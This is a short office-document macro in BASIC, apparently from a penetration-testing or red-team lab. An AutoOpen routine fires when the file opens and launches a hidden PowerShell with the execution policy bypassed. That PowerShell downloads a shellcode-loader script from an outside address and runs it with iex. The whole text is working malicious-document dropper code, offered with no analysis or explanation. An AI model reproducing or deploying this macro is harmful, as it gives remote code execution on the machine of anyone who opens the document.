REM  *****  BASIC  *****

Sub Main

	strArg = "cmd.exe /c powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.235.130:8000/scripts/shellcode-loaders/runner.ps1'))"
	
	Shell(strArg, 0)

End Sub

Sub AutoOpen()
	Main
End Sub